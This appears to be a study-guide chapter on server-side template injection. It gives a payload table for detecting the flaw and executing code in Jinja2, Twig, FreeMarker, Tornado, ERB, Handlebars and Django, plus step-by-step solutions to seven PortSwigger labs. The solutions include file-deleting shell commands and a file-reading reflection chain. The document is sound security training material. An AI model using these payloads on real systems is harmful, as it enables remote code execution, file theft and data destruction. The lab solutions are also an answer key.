# 07 — SSTI Cheatsheet and PortSwigger Lab Mapping

## 1. Quick-Reference Payload Table

| Goal | Engine | Payload | One-line mechanism |
|---|---|---|---|
| Detect (universal) | Any | `${{<%[%'"}}%\` | Polyglot mixing every major engine's delimiter syntax to provoke a parse error or partial evaluation |
| Confirm math eval | Jinja2/Twig/Tornado | `{{7*7}}` | Expression block evaluated as real code → `49` |
| Confirm math eval | FreeMarker | `${7*7}` | JVM `${ }`-style expression block → `49` |
| Confirm math eval | ERB | `<%= 7*7 %>` | Ruby evaluate-and-print block → `49` |
| Disambiguate Jinja2 vs Twig | Jinja2/Twig | `{{7*'7'}}` | Python string-repeat (`7777777`) vs PHP type-juggle (`49`) |
| Code-context breakout | Jinja2/Twig/Tornado | `existing_var}}<tag>` | Injected `}}` closes early, orphaning the real closing tag, letting raw markup/syntax follow |
| Jinja2 RCE (object graph) | Jinja2 | `''.__class__.__mro__[1].__subclasses__()` then `[N]('id',shell=True,stdout=-1).communicate()` | Walk from any object → `object` base class → enumerate all loaded subclasses → instantiate `subprocess.Popen` |
| Jinja2 RCE (globals pivot) | Jinja2 | `request.application.__globals__.__builtins__.__import__('os').popen('id').read()` | Pivot through a function's `__globals__` to reach `__builtins__`, dynamically import `os`, run command |
| Twig RCE (classic) | Twig | `_self.env.registerUndefinedFilterCallback("exec")` then `_self.env.getFilter("id")` | Register `exec` as fallback for unknown filters, then trigger an unknown filter lookup to invoke it |
| Twig RCE (custom chain) | Twig | App-specific — enumerate object methods via errors, chain legitimate methods | E.g., `setAvatar()` to point a tracked file path at a target file, then `gdprDelete()` to delete it |
| FreeMarker RCE | FreeMarker | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` | `?new()` instantiates the built-in `Execute` utility class, which wraps `Runtime.exec()` |
| FreeMarker file read (sandbox) | FreeMarker | `${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/path').toURL().openStream().readAllBytes()?join(" ")}` | Reflection chain from any object → `Class` → code location `URI` → `.resolve()` to redirect to arbitrary path → open stream and read |
| Velocity RCE | Velocity | Reflection chain via `.getClass().forName("java.lang.Runtime")...` | Same JVM reflection philosophy as FreeMarker, reaching `Runtime.exec()` |
| Tornado RCE | Tornado | `{% import os %}{{os.popen('id').read()}}` | Tornado's `{% %}` block permits raw Python `import` statements, unlike Jinja2 |
| ERB RCE | ERB | `<%= \`id\` %>` | Ruby backtick operator runs the shell command and returns captured stdout into the rendered page |
| Handlebars RCE | Handlebars | Documented `#with`/`#each`/`.push`/`.pop` chain reaching `Function` constructor → `require('child_process').exec(...)` | Abuses helper/lookup resolution to reach JS's `Function` constructor since no direct code-eval syntax exists |
| Django info disclosure | Django Templates | `{{settings.SECRET_KEY}}` (or traversal to whatever object is exposed) | Django's template language blocks arbitrary method calls but still permits attribute traversal into exposed objects |

## 2. PortSwigger Web Security Academy — Full SSTI Lab Progression

The labs below are listed in the **exact order they appear in PortSwigger's SSTI topic**, which is also
their intended difficulty progression. Work through them in this order.

### Lab 1 — Basic server-side template injection
- **Engine:** ERB (Ruby)
- **Context:** Plaintext
- **Maps to:** File `01` section 3.1 (plaintext detection), File `04` section 5
- **Workflow:**
  1. Note the `message` URL parameter renders an "out of stock" notice — a classic plaintext-context
     candidate.
  2. Fuzz with the polyglot: `${{<%[%'"}}%\` → error response names the ERB template engine directly.
  3. Confirm with `<%= 7*7 %>` → renders `49`.
  4. Exploit with `<%= system('rm /home/carlos/morale.txt') %>` to delete the target file and solve the
     lab.

### Lab 2 — Basic server-side template injection (code context)
- **Engine:** Tornado (Python)
- **Context:** Code (existing `{{user.name}}`-style expression)
- **Maps to:** File `01` section 3.2 (code-context breakout), File `04` section 4
- **Workflow:**
  1. Identify the `blog-post-author-display` parameter, which controls which property
     (`user.name`/`user.first_name`/`user.nickname`) gets rendered inside an existing expression.
  2. Break out and confirm with: `blog-post-author-display=user.name}}{{7*7}}` → renders `49` after the
     name, proving the injected `}}` closed the real expression early.
  3. Exploit: `blog-post-author-display=user.name}}{% import os %}{{os.system('rm /home/carlos/morale.txt')`
     — note the deliberately unclosed final `{{` here relies on the application's own template
     appending the real closing `}}` after your injected content, the same orphaning logic from file `01`.

### Lab 3 — Server-side template injection using documentation
- **Engine:** FreeMarker (Java)
- **Context:** Plaintext (template-editing feature)
- **Maps to:** File `04` section 1
- **Workflow:**
  1. Log in as `content-manager:C0nt3ntM4n4g3r` and edit a product description template.
  2. Confirm with `${7*7}` → `49`.
  3. Provoke an error with an undefined reference like `${foobar}` → error names FreeMarker explicitly.
  4. Consult FreeMarker's own documentation FAQ on template security to find the `Execute` utility class,
     then exploit with:
     `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("rm /home/carlos/morale.txt")}`

### Lab 4 — Server-side template injection in an unknown language with a documented exploit
- **Engine:** Handlebars (JavaScript/Node.js)
- **Context:** Plaintext
- **Maps to:** File `04` section 6
- **Workflow:**
  1. Confirm template syntax is being parsed, but arithmetic probes (`{{7*7}}`) don't evaluate — a strong
     signal of a logic-less engine.
  2. Identify Handlebars from syntax/error clues, then deliberately search for ("Handlebars server-side
     template injection") rather than attempting to derive a code-execution primitive from first
     principles.
  3. Adapt the documented `#with`/`#each` helper-chain exploit (file `04` section 6.2) substituting
     `rm /home/carlos/morale.txt` as the command to run.

### Lab 5 — Server-side template injection with information disclosure via user-supplied objects
- **Engine:** Django Templates (Python)
- **Context:** Plaintext (template-editing feature)
- **Maps to:** File `04` section 7 (Django note), File `05` Phase 6.3
- **Workflow:**
  1. Edit a product description template; change an expression to an invalid fuzz string and save.
  2. The resulting error names the Django framework.
  3. Because Django's template language deliberately restricts arbitrary method-call chaining, the
     achievable impact here is **information disclosure**, not RCE — explore exposed objects in
     context (e.g., `settings`) to extract the framework's `SECRET_KEY` and submit it to solve the lab.
  4. **Key lesson:** don't force an RCE narrative onto an engine deliberately designed to prevent it;
     report the real, achieved impact.

### Lab 6 — Server-side template injection in a sandboxed environment
- **Engine:** FreeMarker (Java), sandbox-restricted (`new()` blocked)
- **Context:** Plaintext (template-editing feature), with access to a `product` object
- **Maps to:** File `04` section 1.3
- **Workflow:**
  1. Confirm you have access to a `product` object in the template context.
  2. Consult the JavaDoc for Java's base `Object` class to find universally-available reflection methods.
  3. Confirm `${product.getClass()}` succeeds, proving reflection-style access is reachable even with
     `new()` blocked.
  4. Build the full reflection chain to redirect into an arbitrary file path and read it:
     `${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}`
  5. Submit the disclosed secret key to solve the lab.

### Lab 7 — Server-side template injection with a custom exploit
- **Engine:** Twig (PHP)
- **Context:** Code (existing `{{user.name}}`-style expression), with access to a `user` object
- **Maps to:** File `03` section 5 (this lab is the direct basis for that section)
- **Workflow:**
  1. Confirm the same code-context breakout pattern from Lab 2 applies here (`blog-post-author-display`
     parameter again).
  2. Investigate the custom avatar upload feature; upload an invalid image to disclose the
     `user.setAvatar()` method name and the file path `/home/carlos/User.php` via the resulting error
     message.
  3. Upload one valid avatar first to establish a baseline working avatar record.
  4. In the breakout point, set the avatar to an arbitrary path:
     `blog-post-author-display=user.name}}{{user.setAvatar('/home/carlos/morale.txt','image/jpeg')}}`
     (note: the error message will indicate a MIME type argument is required — supply it as shown).
  5. Reload to refresh the template, then call the cleanup method to delete the now-targeted file:
     `blog-post-author-display=user.name}}{{user.gdprDelete()}}`
  6. Reload the page containing the test comment to actually execute the template and solve the lab.

## 3. Lab-to-File Quick Index

| Lab # | Lab name | Primary file to study |
|---|---|---|
| 1 | Basic SSTI (ERB) | `01` §3.1, `04` §5 |
| 2 | Basic SSTI, code context (Tornado) | `01` §3.2, `04` §4 |
| 3 | SSTI using documentation (FreeMarker) | `04` §1 |
| 4 | SSTI, unknown language, documented exploit (Handlebars) | `04` §6 |
| 5 | SSTI, info disclosure via user-supplied objects (Django) | `04` §7, `05` Phase 6.3 |
| 6 | SSTI in a sandboxed environment (FreeMarker) | `04` §1.3 |
| 7 | SSTI with a custom exploit (Twig) | `03` §5 |

## 4. General Real-World Reporting Notes

- Always state the **confirmed achieved impact** precisely (information disclosure vs. file
  read/write/delete vs. full RCE) — don't inflate severity in a report beyond what you actually
  demonstrated.
- Where RCE is achieved, demonstrate it with a clearly non-destructive proof command (`id`, `whoami`)
  before describing further potential impact, rather than running destructive commands during initial
  proof-of-concept.
- Note the **root cause** in every report the same way you would for SQL injection: user input was
  concatenated into the template source rather than passed in as data. Remediation guidance should mirror
  SQLi remediation in spirit — use the engine's safe data-binding mechanism, never let user input become
  part of the parsed template structure, and apply sandboxing as defense-in-depth only, never as the sole
  control.
